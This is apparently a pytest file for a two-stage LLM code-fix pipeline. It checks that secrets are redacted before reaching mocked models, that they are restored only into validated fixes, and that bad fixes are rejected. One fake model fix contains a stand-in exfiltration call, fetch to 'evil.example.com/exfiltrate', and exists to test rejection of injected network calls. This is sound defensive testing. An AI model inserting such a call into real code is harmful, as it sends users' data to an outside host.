"""Integration-style tests for the S6 LLM pipeline (call_llm_a + call_llm_b)
against fake HTTP transports - no real network calls. Proves: redaction
happens before anything reaches a "model", LLM A's own output is redacted
again, and LLM B's response is validated before real secrets are ever
restored into it.
"""

import json

import httpx

from routes_shared.remediation import FixConstraints, Snapshot
from worker.llm.client import LLMClient
from worker.llm.llm_a import call_llm_a
from worker.llm.llm_b import call_llm_b

REAL_SECRET = "abcd1234efgh5678ijkl"

SNAPSHOT_CODE = f'''export async function GET(request) {{
  const apiSecret = "{REAL_SECRET}";
  const result = doSomething(apiSecret);
  return NextResponse.json({{ ok: true }});
}}
'''

SNAPSHOT = Snapshot(file="app/api/search/route.ts", start_line=1, end_line=5, code=SNAPSHOT_CODE)
CONSTRAINTS = FixConstraints(file=SNAPSHOT.file, start_line=SNAPSHOT.start_line, end_line=SNAPSHOT.end_line)

FINDING = {
    "title": "User input used to build a SQL query",
    "rule_id": "routes.sqli.pg-tainted-query",
    "plain_description": "Input reaches a database query without parameterisation.",
}


def _llm_a_client(record: list) -> LLMClient:
    content = json.dumps({
        "prompt_for_fix": "Parameterise the query and stop hardcoding the API secret.",
        "testbench": "test('exploit', () => {})",
    })

    def handler(request: httpx.Request) -> httpx.Response:
        record.append(request)
        return httpx.Response(200, json={"choices": [{"message": {"content": content}}]})

    return LLMClient(endpoint="http://fake-a/v1/chat/completions", api_key="k", model="m",
                     transport=httpx.MockTransport(handler))


def _llm_b_client(content: str, record: list) -> LLMClient:
    def handler(request: httpx.Request) -> httpx.Response:
        record.append(request)
        return httpx.Response(200, json={"choices": [{"message": {"content": content}}]})

    return LLMClient(endpoint="http://fake-b/v1/chat/completions", api_key="k", model="m",
                     transport=httpx.MockTransport(handler))


def test_llm_a_never_sends_the_real_secret():
    requests: list = []
    result = call_llm_a(_llm_a_client(requests), FINDING, SNAPSHOT)

    sent_text = requests[0].content.decode()
    assert REAL_SECRET not in sent_text
    assert REAL_SECRET not in result.redacted_snapshot_code
    assert REAL_SECRET not in result.prompt_for_fix
    assert REAL_SECRET not in result.testbench
    assert REAL_SECRET in result.placeholder_map.values()


def test_llm_b_accepts_a_good_fix_and_restores_the_real_secret():
    a_result = call_llm_a(_llm_a_client([]), FINDING, SNAPSHOT)
    secret_placeholder = next(k for k, v in a_result.placeholder_map.items() if v == REAL_SECRET)

    good_fix = (
        "```ts\n"
        "export async function GET(request) {\n"
        f"  const apiSecret = {secret_placeholder};\n"
        "  const result = doSomethingSafely(apiSecret);\n"
        "  return NextResponse.json({ ok: true });\n"
        "}\n"
        "```"
    )
    b_requests: list = []
    b_result = call_llm_b(_llm_b_client(good_fix, b_requests), a_result, SNAPSHOT, CONSTRAINTS)

    assert b_result.valid is True
    assert b_result.errors == []
    assert REAL_SECRET in b_result.fixed_code
    assert REAL_SECRET not in b_requests[0].content.decode()  # LLM B never saw the real value either


def test_llm_b_rejects_a_fix_that_adds_a_new_import():
    a_result = call_llm_a(_llm_a_client([]), FINDING, SNAPSHOT)

    bad_fix = (
        "```ts\n"
        'import fs from "fs";\n'
        "export async function GET(request) {\n"
        "  const result = doSomething();\n"
        "  return NextResponse.json({ ok: true });\n"
        "}\n"
        "```"
    )
    b_result = call_llm_b(_llm_b_client(bad_fix, []), a_result, SNAPSHOT, CONSTRAINTS)

    assert b_result.valid is False
    assert b_result.fixed_code is None
    assert any("import" in e for e in b_result.errors)


def test_llm_b_rejects_a_fix_that_adds_a_network_call():
    a_result = call_llm_a(_llm_a_client([]), FINDING, SNAPSHOT)

    bad_fix = (
        "```ts\n"
        "export async function GET(request) {\n"
        "  await fetch('https://evil.example.com/exfiltrate');\n"
        "  return NextResponse.json({ ok: true });\n"
        "}\n"
        "```"
    )
    b_result = call_llm_b(_llm_b_client(bad_fix, []), a_result, SNAPSHOT, CONSTRAINTS)

    assert b_result.valid is False
    assert b_result.fixed_code is None
    assert any("network" in e for e in b_result.errors)


def test_llm_b_rejects_unparseable_code():
    a_result = call_llm_a(_llm_a_client([]), FINDING, SNAPSHOT)

    b_result = call_llm_b(_llm_b_client("export async function GET( {{{ not valid js at all", []),
                          a_result, SNAPSHOT, CONSTRAINTS)

    assert b_result.valid is False
    assert b_result.fixed_code is None
    assert any("syntax" in e.lower() for e in b_result.errors)
